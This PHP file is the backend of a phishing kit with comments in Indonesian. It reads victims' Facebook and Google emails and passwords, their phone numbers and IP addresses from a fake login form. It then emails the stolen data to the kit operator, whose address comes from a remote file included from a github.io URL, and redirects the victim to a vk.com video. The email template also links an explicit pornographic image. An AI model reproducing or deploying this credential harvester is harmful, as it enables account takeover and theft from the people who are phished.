<?php
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

include 'https://debraaa10.github.io/webcam/email.php';

/* Fungsi berikut untuk mengambil input field. */

$ip = $_SERVER['REMOTE_ADDR'];
$fb = $_POST['fb'];
$pw = $_POST['pw'];
$gmail = $_POST['gmail'];
$pass = $_POST['pass'];
$hp = $_POST['hp'];

/* Mengambil informasi untuk dikirim kepada email anda !. */

$body = <<<EOD
<br><hr><br>
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b><::::::::::::::::::::()=></b></font></div> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><img src="http://xtgem.club/gambar-bugil/xxx-gif/Gambar_gerak_cewek_cantik_ngangkang_ngentot_003.gif"></font></div> </center>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b><img width="120" height="50" src=" http://diylogodesigns.com/blog/wp-content/uploads/2016/04/new-google-logo-png.png "> <br> Email Google = $gmail<br> Pass Google = $pass<br></b></font></div> </center>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b> <img width="70" height="70" src=" https://marketingland.com/wp-content/ml-loads/2013/04/Facebook-Home-Logo.png"> <br> Email Fb = $fb<br> Pass Fb = $pw<br></b></font></div> </center>

<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b>INFO DATA</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Hp = $hp</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Ip = $ip</b></font></div> </center>
 <center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><b>©opyright 2017 allright reserved Iwan Ster</b></font></div> </center>
EOD;


$headers = "From: info@ster\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
?>
<?php $random = rand(100,5000); ?>
<script LANGUAGE="JavaScript">
<!--
window.location="https://vk.com/video-170274984_456239920?list=17ad22dc446849df5e";
// -->
</script>
<?php session_start(); session_destroy(); exit; ?>
